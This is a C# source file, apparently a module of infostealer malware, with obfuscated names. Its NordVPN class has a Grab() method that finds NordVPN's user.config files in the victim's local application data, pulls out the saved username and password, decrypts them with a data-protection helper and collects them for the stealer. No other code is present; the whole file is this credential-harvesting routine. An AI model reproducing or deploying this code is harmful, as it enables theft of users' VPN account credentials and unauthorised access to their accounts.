using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Xml;
using C6Zy;
using reJu9lk2r;

namespace rk937aHHc
{
	public class NordVPN : EtbH
	{
		public NordVPN()
		{
			this.DPluevz4ps = "NordVPN";
		}

		public string DPluevz4ps { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();

            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            DirectoryInfo nordVpnDir = new DirectoryInfo(Path.Combine(localAppData, "NordVPN"));

            if (!nordVpnDir.Exists)
                return list;

            foreach (DirectoryInfo exeDir in nordVpnDir.GetDirectories("NordVpn.exe*"))
            {
                foreach (DirectoryInfo profileDir in exeDir.GetDirectories())
                {
                    string configPath = Path.Combine(profileDir.FullName, "user.config");

                    if (!File.Exists(configPath))
                        continue;

                    try
                    {
                        XmlDocument xml = new XmlDocument();
                        xml.Load(configPath);

                        string encUser = xml
                            .SelectSingleNode("//setting[@name='Username']/value")
                            ?.InnerText;

                        string encPass = xml
                            .SelectSingleNode("//setting[@name='Password']/value")
                            ?.InnerText;

                        if (string.IsNullOrEmpty(encUser) || string.IsNullOrEmpty(encPass))
                            continue;

                        list.Add(new WTitxI2m
                        {
                            data1 = "-",
                            data2 = GHbU7Rc.ZDzD1h(
                                Convert.FromBase64String(encUser),
                                DataProtectionScope.LocalMachine
                            ),
                            data3 = GHbU7Rc.ZDzD1h(
                                Convert.FromBase64String(encPass),
                                DataProtectionScope.LocalMachine
                            ),
                            data4 = "NordVPN"
                        });
                    }
                    catch
                    {
                    }
                }
            }

            return list;
        }
    }
}
